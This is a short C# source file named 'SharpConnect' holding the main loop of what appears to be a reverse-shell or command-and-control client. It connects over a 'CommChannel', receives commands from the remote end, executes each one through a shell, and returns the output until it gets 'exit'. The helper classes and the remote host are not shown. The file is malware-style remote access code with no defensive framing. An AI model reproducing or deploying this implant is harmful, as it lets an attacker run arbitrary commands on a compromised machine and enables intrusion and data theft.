using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Text;
using System.Diagnostics;


namespace SharpConnect {
    public class Program
    {
        static void Main(string[] args)
        {

            Console.WriteLine("Welcome to SharpConnect!");

            CommChannel ccChannel = new CommChannel(true);
            if(!ccChannel.Connect())
            {
                return;
            }

            string lastCmd = "";
            do
            {
                string nextCmd = ccChannel.receiveCommand();
                if(nextCmd == null)
                {
                    break;
                }
                lastCmd = nextCmd.Trim();

                string output = Shell.exec(nextCmd);
                if(output == null)
                {
                    break;
                }
                if (!ccChannel.respondWith(output))
                {
                    break;
                }
            } while (lastCmd != "exit");

        }
    }
}
